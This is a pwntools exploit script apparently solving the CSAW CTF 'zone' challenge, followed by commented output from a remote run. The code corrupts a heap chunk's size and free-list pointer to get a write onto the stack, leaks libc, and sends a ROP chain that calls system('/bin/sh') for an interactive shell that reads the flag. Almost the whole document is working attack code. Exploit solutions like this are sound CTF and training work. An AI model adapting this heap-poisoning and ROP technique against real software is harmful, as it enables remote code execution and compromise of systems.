#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context(arch='amd64', os='linux', aslr=True, terminal=['tmux', 'neww'])

if args['GDB']:
    elf, libc = ELF('./zone-amd64-2.23-0ubuntu9'), ELF('libs/amd64/0ubuntu9/libc-2.23.so')
    io = gdb.debug('./zone-amd64-2.23-0ubuntu9', gdbscript='''\
        c
    ''')
elif args['REMOTE']:
    elf, libc = ELF('./zone'), ELF('libs/amd64/0ubuntu9/libc-2.23.so')
    io = remote('pwn.chal.csaw.io', 5223)
else:
    elf, libc = ELF('./zone-amd64-2.23-0ubuntu9'), ELF('libs/amd64/0ubuntu9/libc-2.23.so')
    io = process(['stdbuf', '-i0', '-o0', '-e0', './zone-amd64-2.23-0ubuntu9'])


def allocate(size):
    io.recvuntil('5) Exit\n')
    io.sendline('1')
    io.sendline(str(size))


def delete_last():
    io.recvuntil('5) Exit\n')
    io.sendline('2')
    io.recvuntil('Free')


def write_last(data, newline=True):
    io.recvuntil('5) Exit\n')
    io.sendline('3')
    io.sendline(data) if newline else io.send(data)


def print_last():
    io.recvuntil('5) Exit\n')
    io.sendline('4')
    return io.recvline()


io.recvuntil('Environment setup: ')
stack_leak_address = int(io.recvline(), 16)
success('stack leak address: %s' % hex(stack_leak_address))

# a chunk is of the form
# {size|ptr to the next free chunk of same size|data}

# allocate a 0x40 byte block
allocate(0x40)
# overflow the 65th byte of the block to be 0x80, so to modify the size of the next free block
write_last('A' * 0x40 + chr(0x80), newline=False)
# allocate another 0x40 byte block (the one with the size modified)
allocate(0x40)
# free this last block (which will be put at the top of the list of free chunks of size 0x80)
delete_last()
# allocate a chunk of size 0x80 to get this chunk
allocate(0x80)
# we can now write 0x80 characters into a chunk which is in the list of chunks of size 0x40
# so we can overflow in the next 0x40 chunk and mess its pointer to the next free chunk
write_last(fit({cyclic_find('jaaaaaaa', n=8): p64(stack_leak_address + 0x80 - 0x8)}))
# allocate two more 0x40 chunks
# the second chunk will be in the stack (since, in the first chunk, we changed the pointer to the next free)
allocate(0x40)
allocate(0x40)
# print the content of the chunk to leak an address from libc
libc_leak_address = u64(print_last()[:6].ljust(8, '\x00'))
success('libc leak address: %s' % hex(libc_leak_address))
libc.address = libc_leak_address - (libc.symbols['__libc_start_main'] + 240)
success('libc address: %s' % hex(libc.address))

rop = ROP(libc)
rop.system(next(libc.search('/bin/sh')))
print rop.dump()

# write in the chunk to change the return address
write_last(bytes(rop))

# exit to return to execute the rop chain
io.recvuntil('5) Exit\n')
io.sendline('5')

io.interactive()

# $ ./zone.py REMOTE
# [+] Opening connection to pwn.chal.csaw.io on port 5223: Done
# [*] '/home/ubuntu/vbox/zone'
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000)
# [*] '/home/ubuntu/vbox/libc-amd64-2.23-0ubuntu9.so'
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [+] stack leak address: 0x7ffd63409140
# [+] libc leak address: 0x7efc0b64a830
# [+] libc address: 0x7efc0b62a000
# [*] Loaded cached gadgets for './libc-amd64-2.23-0ubuntu9.so'
# 0x0000:   0x7efc0b64b102 pop rdi; ret
# 0x0008:   0x7efc0b7b6d17
# 0x0010:   0x7efc0b66f390 system
# 0x0018:       'gaaahaaa' <pad>
# [*] Switching to interactive mode
# $ ls
# flag
# zone
# $ cat flag
# flag{d0n7_let_m3_g3t_1n_my_z0n3}
